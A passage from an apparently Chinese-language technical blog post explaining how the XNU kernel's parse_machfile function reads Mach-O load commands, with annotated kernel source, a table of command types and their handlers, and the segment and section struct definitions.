class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span></span><br><span class="line">load_return_t</span><br><span class="line"><span class="title">parse_machfile</span><span class="params">(</span><br><span class="line">	<span class="keyword">struct</span> vnode 		*vp,       </span><br><span class="line">	vm_map_t		<span class="built_in">map</span>,</span><br><span class="line">	thread_t		thread,</span><br><span class="line">	<span class="keyword">struct</span> mach_header	*header,</span><br><span class="line">	off_t			file_offset,</span><br><span class="line">	off_t			macho_size,</span><br><span class="line">	<span class="keyword">int</span>			depth,</span><br><span class="line">	int64_t			aslr_offset,</span><br><span class="line">	int64_t			dyld_aslr_offset,</span><br><span class="line">	load_result_t		*result</span><br><span class="line">)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	[...] <span class="comment">//此处省略大量初始化与检测</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span><br><span class="line">		 * Loop through each of the load_commands indicated by the</span><br><span class="line">		 * Mach-O header; if an absurd value is provided, we just</span><br><span class="line">		 * run off the end of the reserved section by incrementing</span><br><span class="line">		 * the offset too far, so we are implicitly fail-safe.</span><br><span class="line">		 */</span></span><br><span class="line">		offset = mach_header_sz;</span><br><span class="line">		ncmds = header-&gt;ncmds;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (ncmds--) &#123;</span><br><span class="line">			<span class="comment">/*</span><br><span class="line">			 *	Get a pointer to the command.</span><br><span class="line">			 */</span></span><br><span class="line">			lcp = (<span class="keyword">struct</span> load_command *)(addr + offset);</span><br><span class="line">			<span class="comment">//lcp设为当前要解析的cmd的地址</span></span><br><span class="line">			oldoffset = offset;</span><br><span class="line">			<span class="comment">//oldoffset是从macho文件内存开始的地方偏移到当前command的偏移量</span></span><br><span class="line">			offset += lcp-&gt;cmdsize;</span><br><span class="line">			<span class="comment">//重新计算offset，再加上当前command的长度，offset的值为文件内存起始地址到下一个command的偏移量</span></span><br><span class="line">			<span class="comment">/*</span><br><span class="line">			 * Perform prevalidation of the struct load_command</span><br><span class="line">			 * before we attempt to use its contents.  Invalid</span><br><span class="line">			 * values are ones which result in an overflow, or</span><br><span class="line">			 * which can not possibly be valid commands, or which</span><br><span class="line">			 * straddle or exist past the reserved section at the</span><br><span class="line">			 * start of the image.</span><br><span class="line">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (oldoffset &gt; offset ||</span><br><span class="line">			    lcp-&gt;cmdsize &lt; <span class="keyword">sizeof</span>(<span class="keyword">struct</span> load_command) ||</span><br><span class="line">			    offset &gt; header-&gt;sizeofcmds + mach_header_sz) &#123;</span><br><span class="line">				ret = LOAD_BADMACHO;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//做了一个检测，与如何加载进入内存无关</span></span><br><span class="line"></span><br><span class="line">			<span class="comment">/*</span><br><span class="line">			 * Act on struct load_command's for which kernel</span><br><span class="line">			 * intervention is required.</span><br><span class="line">			 */</span></span><br><span class="line">			<span class="keyword">switch</span>(lcp-&gt;cmd) &#123;</span><br><span class="line">			<span class="keyword">case</span> LC_SEGMENT:</span><br><span class="line">				[...]</span><br><span class="line">				ret = load_segment(lcp,</span><br><span class="line">				                   header-&gt;filetype,</span><br><span class="line">				                   control,</span><br><span class="line">				                   file_offset,</span><br><span class="line">				                   macho_size,</span><br><span class="line">				                   vp,</span><br><span class="line">				                   <span class="built_in">map</span>,</span><br><span class="line">				                   slide,</span><br><span class="line">				                   result);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_SEGMENT_64:</span><br><span class="line">				[...]</span><br><span class="line">				ret = load_segment(lcp,</span><br><span class="line">				                   header-&gt;filetype,</span><br><span class="line">				                   control,</span><br><span class="line">				                   file_offset,</span><br><span class="line">				                   macho_size,</span><br><span class="line">				                   vp,</span><br><span class="line">				                   <span class="built_in">map</span>,</span><br><span class="line">				                   slide,</span><br><span class="line">				                   result);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_UNIXTHREAD:</span><br><span class="line">				<span class="keyword">if</span> (pass != <span class="number">1</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				ret = load_unixthread(</span><br><span class="line">						 (<span class="keyword">struct</span> thread_command *) lcp,</span><br><span class="line">						 thread,</span><br><span class="line">						 slide,</span><br><span class="line">						 result);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_MAIN:</span><br><span class="line">				<span class="keyword">if</span> (pass != <span class="number">1</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">if</span> (depth != <span class="number">1</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				ret = load_main(</span><br><span class="line">						 (<span class="keyword">struct</span> entry_point_command *) lcp,</span><br><span class="line">						 thread,</span><br><span class="line">						 slide,</span><br><span class="line">						 result);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_LOAD_DYLINKER:</span><br><span class="line">				<span class="keyword">if</span> (pass != <span class="number">3</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">if</span> ((depth == <span class="number">1</span>) &amp;&amp; (dlp == <span class="number">0</span>)) &#123;</span><br><span class="line">					dlp = (<span class="keyword">struct</span> dylinker_command *)lcp;</span><br><span class="line">					dlarchbits = (header-&gt;cputype &amp; CPU_ARCH_MASK);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					ret = LOAD_FAILURE;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_UUID:</span><br><span class="line">				<span class="keyword">if</span> (pass == <span class="number">1</span> &amp;&amp; depth == <span class="number">1</span>) &#123;</span><br><span class="line">					ret = load_uuid((<span class="keyword">struct</span> uuid_command *) lcp,</span><br><span class="line">							(<span class="keyword">char</span> *)addr + mach_header_sz + header-&gt;sizeofcmds,</span><br><span class="line">							result);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_CODE_SIGNATURE:</span><br><span class="line">				[...]</span><br><span class="line">				ret = load_code_signature(</span><br><span class="line">					(<span class="keyword">struct</span> linkedit_data_command *) lcp,</span><br><span class="line">					vp,</span><br><span class="line">					file_offset,</span><br><span class="line">					macho_size,</span><br><span class="line">					header-&gt;cputype,</span><br><span class="line">					result);</span><br><span class="line">				[...]</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> CONFIG_CODE_DECRYPTION</span></span><br><span class="line">			<span class="keyword">case</span> LC_ENCRYPTION_INFO:</span><br><span class="line">			<span class="keyword">case</span> LC_ENCRYPTION_INFO_64:</span><br><span class="line">				<span class="keyword">if</span> (pass != <span class="number">3</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				ret = set_code_unprotect(</span><br><span class="line">					(<span class="keyword">struct</span> encryption_info_command *) lcp,</span><br><span class="line">					addr, <span class="built_in">map</span>, slide, vp, file_offset,</span><br><span class="line">					header-&gt;cputype, header-&gt;cpusubtype);</span><br><span class="line">				<span class="keyword">if</span> (ret != LOAD_SUCCESS) &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"proc %d: set_code_unprotect() error %d "</span></span><br><span class="line">					       <span class="string">"for file \"%s\"\n"</span>,</span><br><span class="line">					       p-&gt;p_pid, ret, vp-&gt;v_name);</span><br><span class="line">					<span class="comment">/* </span><br><span class="line">					 * Don't let the app run if it's </span><br><span class="line">					 * encrypted but we failed to set up the</span><br><span class="line">					 * decrypter. If the keys are missing it will</span><br><span class="line">					 * return LOAD_DECRYPTFAIL.</span><br><span class="line">					 */</span></span><br><span class="line">					 <span class="keyword">if</span> (ret == LOAD_DECRYPTFAIL) &#123;</span><br><span class="line">						<span class="comment">/* failed to load due to missing FP keys */</span></span><br><span class="line">						proc_lock(p);</span><br><span class="line">						p-&gt;p_lflag |= P_LTERM_DECRYPTFAIL;</span><br><span class="line">						proc_unlock(p);</span><br><span class="line">					 &#125;</span><br><span class="line">					 psignal(p, SIGKILL);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="comment">/* Other commands are ignored by the kernel */</span></span><br><span class="line">				ret = LOAD_SUCCESS;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (ret != LOAD_SUCCESS)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (ret != LOAD_SUCCESS)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	[...] <span class="comment">//此处略去加载之后的处理代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-1cmdsize字段">3.1cmdsize字段</h3><p>这里主要看while循环刚刚进入的时候几行代码,来理解是如何通过load_command的cmd字段来解析Macho文件的数据。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">lcp = (<span class="keyword">struct</span> load_command *)(addr + offset);</span><br><span class="line"><span class="comment">//lcp设为当前要解析的cmd的地址</span></span><br><span class="line">oldoffset = offset;</span><br><span class="line"><span class="comment">//oldoffset是从macho文件内存开始的地方偏移到当前command的偏移量</span></span><br><span class="line">offset += lcp-&gt;cmdsize;</span><br><span class="line"><span class="comment">//重新计算offset，再加上当前command的长度，offset的值为文件内存起始地址到下一个command的偏移量</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="3-2_cmd字段">3.2 cmd字段</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(lcp-&gt;cmd) &#123;</span><br><span class="line">			<span class="keyword">case</span> LC_SEGMENT:</span><br><span class="line">				[...]</span><br><span class="line">				ret = load_segment(lcp,</span><br><span class="line">				                   header-&gt;filetype,</span><br><span class="line">				                   control,</span><br><span class="line">				                   file_offset,</span><br><span class="line">				                   macho_size,</span><br><span class="line">				                   vp,</span><br><span class="line">				                   <span class="built_in">map</span>,</span><br><span class="line">				                   slide,</span><br><span class="line">				                   result);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_SEGMENT_64:</span><br><span class="line">				[...]</span><br><span class="line">				ret = load_segment(lcp,</span><br><span class="line">				                   header-&gt;filetype,</span><br><span class="line">				                   control,</span><br><span class="line">				                   file_offset,</span><br><span class="line">				                   macho_size,</span><br><span class="line">				                   vp,</span><br><span class="line">				                   <span class="built_in">map</span>,</span><br><span class="line">				                   slide,</span><br><span class="line">				                   result);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_UNIXTHREAD:</span><br><span class="line">				<span class="keyword">if</span> (pass != <span class="number">1</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				ret = load_unixthread(</span><br><span class="line">						 (<span class="keyword">struct</span> thread_command *) lcp,</span><br><span class="line">						 thread,</span><br><span class="line">						 slide,</span><br><span class="line">						 result);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_MAIN:</span><br><span class="line">				<span class="keyword">if</span> (pass != <span class="number">1</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">if</span> (depth != <span class="number">1</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				ret = load_main(</span><br><span class="line">						 (<span class="keyword">struct</span> entry_point_command *) lcp,</span><br><span class="line">						 thread,</span><br><span class="line">						 slide,</span><br><span class="line">						 result);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_LOAD_DYLINKER:</span><br><span class="line">				<span class="keyword">if</span> (pass != <span class="number">3</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">if</span> ((depth == <span class="number">1</span>) &amp;&amp; (dlp == <span class="number">0</span>)) &#123;</span><br><span class="line">					dlp = (<span class="keyword">struct</span> dylinker_command *)lcp;</span><br><span class="line">					dlarchbits = (header-&gt;cputype &amp; CPU_ARCH_MASK);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					ret = LOAD_FAILURE;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_UUID:</span><br><span class="line">				<span class="keyword">if</span> (pass == <span class="number">1</span> &amp;&amp; depth == <span class="number">1</span>) &#123;</span><br><span class="line">					ret = load_uuid((<span class="keyword">struct</span> uuid_command *) lcp,</span><br><span class="line">							(<span class="keyword">char</span> *)addr + mach_header_sz + header-&gt;sizeofcmds,</span><br><span class="line">							result);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> LC_CODE_SIGNATURE:</span><br><span class="line">				[...]</span><br><span class="line">				ret = load_code_signature(</span><br><span class="line">					(<span class="keyword">struct</span> linkedit_data_command *) lcp,</span><br><span class="line">					vp,</span><br><span class="line">					file_offset,</span><br><span class="line">					macho_size,</span><br><span class="line">					header-&gt;cputype,</span><br><span class="line">					result);</span><br><span class="line">				[...]</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> CONFIG_CODE_DECRYPTION</span></span><br><span class="line">			<span class="keyword">case</span> LC_ENCRYPTION_INFO:</span><br><span class="line">			<span class="keyword">case</span> LC_ENCRYPTION_INFO_64:</span><br><span class="line">				<span class="keyword">if</span> (pass != <span class="number">3</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				ret = set_code_unprotect(</span><br><span class="line">					(<span class="keyword">struct</span> encryption_info_command *) lcp,</span><br><span class="line">					addr, <span class="built_in">map</span>, slide, vp, file_offset,</span><br><span class="line">					header-&gt;cputype, header-&gt;cpusubtype);</span><br><span class="line">				<span class="keyword">if</span> (ret != LOAD_SUCCESS) &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"proc %d: set_code_unprotect() error %d "</span></span><br><span class="line">					       <span class="string">"for file \"%s\"\n"</span>,</span><br><span class="line">					       p-&gt;p_pid, ret, vp-&gt;v_name);</span><br><span class="line">					<span class="comment">/* </span><br><span class="line">					 * Don't let the app run if it's </span><br><span class="line">					 * encrypted but we failed to set up the</span><br><span class="line">					 * decrypter. If the keys are missing it will</span><br><span class="line">					 * return LOAD_DECRYPTFAIL.</span><br><span class="line">					 */</span></span><br><span class="line">					 <span class="keyword">if</span> (ret == LOAD_DECRYPTFAIL) &#123;</span><br><span class="line">						<span class="comment">/* failed to load due to missing FP keys */</span></span><br><span class="line">						proc_lock(p);</span><br><span class="line">						p-&gt;p_lflag |= P_LTERM_DECRYPTFAIL;</span><br><span class="line">						proc_unlock(p);</span><br><span class="line">					 &#125;</span><br><span class="line">					 psignal(p, SIGKILL);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="comment">/* Other commands are ignored by the kernel */</span></span><br><span class="line">				ret = LOAD_SUCCESS;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>
<p>从这一段代码可以看出，根据cmd字段的类型不同，使用了不同的函数来加载。简单的列出一张表看一看在内核代码中不同的command类型都有哪些作用。</p>
<table>
<thead>
<tr>
<th>Command类型</th>
<th style="text-align:left">处理函数</th>
<th style="text-align:left">用途</th>
</tr>
</thead>
<tbody>
<tr>
<td>LC_SEGMENT；LC_SEGMENT_64</td>
<td style="text-align:left">load_segment</td>
<td style="text-align:left">将segment中的数据加载并映射到进程的内存空间去</td>
</tr>
<tr>
<td>LC_LOAD_DYLINKER</td>
<td style="text-align:left">load_dylinker</td>
<td style="text-align:left">调用/usr/lib/dyld程序</td>
</tr>
<tr>
<td>LC_UUID</td>
<td style="text-align:left">load_uuid</td>
<td style="text-align:left">加载128-bit的唯一ID</td>
</tr>
<tr>
<td>LC_THREAD</td>
<td style="text-align:left">load_thread</td>
<td style="text-align:left">开启一个MACH线程，但是不分配栈空间。</td>
</tr>
<tr>
<td>LC_UNIXTHREAD</td>
<td style="text-align:left">load_unixthread</td>
<td style="text-align:left">开启一个UNIX线程</td>
</tr>
<tr>
<td>LC_CODE_SIGNATURE</td>
<td style="text-align:left">load_code_signature</td>
<td style="text-align:left">进行数字签名</td>
</tr>
<tr>
<td>LC_ENCRYPTION_INFO</td>
<td style="text-align:left">set_code_unprotect</td>
<td style="text-align:left">加密二进制文件</td>
</tr>
</tbody>
</table>
<h1 id="0x04_Segment&amp;Section">0x04 Segment&amp;Section</h1><p>加载数据时，主要加载的就是LC_SEGMET活着LC_SEGMENT_64。其他的Segment的用途在上一节已经简单的介绍了，这里不做深究。</p>
<p>LCSEGMENT以及LC_SEGMENT_64的数据结构是这样的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">struct</span> segment_command &#123; <span class="comment">/* for 32-bit architectures */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	cmd;		<span class="comment">/* LC_SEGMENT */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	cmdsize;	<span class="comment">/* includes sizeof section structs */</span></span><br><span class="line">	<span class="keyword">char</span>		segname[<span class="number">16</span>];	<span class="comment">/* segment name */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	vmaddr;		<span class="comment">/* memory address of this segment */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	vmsize;		<span class="comment">/* memory size of this segment */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	fileoff;	<span class="comment">/* file offset of this segment */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	filesize;	<span class="comment">/* amount to map from the file */</span></span><br><span class="line">	<span class="keyword">vm_prot_t</span>	maxprot;	<span class="comment">/* maximum VM protection */</span></span><br><span class="line">	<span class="keyword">vm_prot_t</span>	initprot;	<span class="comment">/* initial VM protection */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	nsects;		<span class="comment">/* number of sections in segment */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> segment_command_64 &#123; <span class="comment">/* for 64-bit architectures */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	cmd;		<span class="comment">/* LC_SEGMENT_64 */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	cmdsize;	<span class="comment">/* includes sizeof section_64 structs */</span></span><br><span class="line">	<span class="keyword">char</span>		segname[<span class="number">16</span>];	<span class="comment">/* segment name */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	vmaddr;		<span class="comment">/* memory address of this segment */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	vmsize;		<span class="comment">/* memory size of this segment */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	fileoff;	<span class="comment">/* file offset of this segment */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	filesize;	<span class="comment">/* amount to map from the file */</span></span><br><span class="line">	<span class="keyword">vm_prot_t</span>	maxprot;	<span class="comment">/* maximum VM protection */</span></span><br><span class="line">	<span class="keyword">vm_prot_t</span>	initprot;	<span class="comment">/* initial VM protection */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	nsects;		<span class="comment">/* number of sections in segment */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看出，这里大部分的数据是用来帮助内核将Segment映射到虚拟内存的。主要要关注的是<code>nsects</code></p>
<p>字段，标示了Segment中有多少secetion。section是具体有用的数据存放的地方。</p>
<p>Section的数据结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> section &#123; <span class="comment">/* for 32-bit architectures */</span></span><br><span class="line">	<span class="keyword">char</span>		sectname[<span class="number">16</span>];	<span class="comment">/* name of this section */</span></span><br><span class="line">	<span class="keyword">char</span>		segname[<span class="number">16</span>];	<span class="comment">/* segment this section goes in */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	addr;		<span class="comment">/* memory address of this section */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	size;		<span class="comment">/* size in bytes of this section */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	offset;		<span class="comment">/* file offset of this section */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	align;		<span class="comment">/* section alignment (power of 2) */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	reloff;		<span class="comment">/* file offset of relocation entries */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	nreloc;		<span class="comment">/* number of relocation entries */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags (section type and attributes)*/</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	reserved1;	<span class="comment">/* reserved (for offset or index) */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	reserved2;	<span class="comment">/* reserved (for count or sizeof) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> section_64 &#123; <span class="comment">/* for 64-bit architectures */</span></span><br><span class="line">	<span class="keyword">char</span>		sectname[<span class="number">16</span>];	<span class="comment">/* name of this section */</span></span><br><span class="line">	<span class="keyword">char</span>		segname[<span class="number">16</span>];	<span class="comment">/* segment this section goes in */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	addr;		<span class="comment">/* memory address of this section */</span></span><br><span class="line">	<span class="keyword">uint64_t</span>	size;		<span class="comment">/* size in bytes of this section */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	offset;		<span class="comment">/* file offset of this section */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	align;		<span class="comment">/* section alignment (power of 2) */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	reloff;		<span class="comment">/* file offset of relocation entries */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	nreloc;		<span class="comment">/* number of relocation entries */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags (section type and 